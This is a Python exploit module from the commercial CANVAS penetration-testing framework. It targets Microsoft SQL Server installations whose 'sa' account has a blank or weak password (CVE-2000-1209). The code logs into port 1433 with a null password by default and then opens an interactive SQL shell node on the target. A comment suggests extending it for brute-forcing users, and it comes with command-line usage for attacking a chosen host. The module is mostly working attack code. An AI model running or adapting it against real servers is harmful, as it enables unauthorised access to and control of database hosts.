#! /usr/bin/env python
"""
MSSQL Works only with TDS ver 7.0 (MSSQL 2k)
(Dave has tested this on MSSQL 2K5, so the above note is not correct :>)
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""
1.0 released.
"""


NOTES="""
Connect to a MSSQL server (with auth or with null password) and return a Shell
"""


DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"]="07/2004"
#DOCUMENTATION["CERT Advisory"]=""
DOCUMENTATION["OSVDB"]="http://www.osvdb.org/displayvuln.php?osvdb_id=15757"
DOCUMENTATION["Notes"]=NOTES
DOCUMENTATION["CVE Name"] = "CVE-2000-1209"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1209"
DOCUMENTATION['CVSS'] = 10.0
NAME="MSSQL (Null) Auth Connect"
DESCRIPTION="Authentication with or without a pass"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows" ] ]
PROPERTY['VERSION'] = ["All"]

import sys
if "." not in sys.path: sys.path.append(".")
from exploitutils import *
import time
from tcpexploit import tcpexploit
import libs.mssql as mssql
from SQLNode import SQLNode
from SQLShellServer import mssqlshellserver


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port=1433
        self.setHost("")
        self.setVersion(1)
        self.badstring=""
        self.db=""
        self.user="sa"
        self.password = "" 
        # You are invited to add more users here (for bruteforce mode):
        self.ssl=0
        self.name=NAME
        return

    def setHost(self, target):
        self.host=target
            
    def setISucceeded(self, func):
        self.ISucceeded=func
                    
    def createShellcode(self, d="", b=""):
        return ""

    def test(self):
        """
        Tests for vulns's presence. Prints out the version if
        found.
        """
        # This would be improved
        host = self.target.interface
        port = self.argsDict.get("port",self.port)        
        
        return 1

    def neededListenerTypes(self):
        return []

    def run(self):
        self.host = self.target.interface
        self.port = self.argsDict.get("port",self.port)
        self.user = self.argsDict.get("user",self.user)
        self.password  =  self.argsDict.get("password",self.password)
        
        self.socknode=self.argsDict["passednodes"][0]
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME,self.host, self.port), showlog=1)
        ret=0
        error=""
        try:
            self.m=mssql.MSSQL(self.host, self.port)
            result=self.m.login(self.user, self.password)
            if(result == None):
                self.log("Error receiving packet")
                return 0
            #result is a mssql::Response()
        except mssql.MSSQLError, msg:
            self.log("Failed: %s" % msg)
            self.setInfo("%s attacking %s:%d (failed)" % (NAME,self.host, self.port), showlog=1)            
            return 0
        
        self.setInfo("%s attacking %s:%d (success)" % (NAME,self.host, self.port), showlog=1)            
        node            = SQLNode()
        node.parentnode = self.socknode
        shell           = mssqlshellserver(self.m, node, logfunction=self.logfunction)
                
        shell.startup()
        node.startup()
        return node
        

    def usage(self):
        print "Usage: %s -t target [-U username: sa -P password:(null) -p port:1433 ]" % sys.argv[0]
    

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret:
        print "\o/"
        ret.interact()
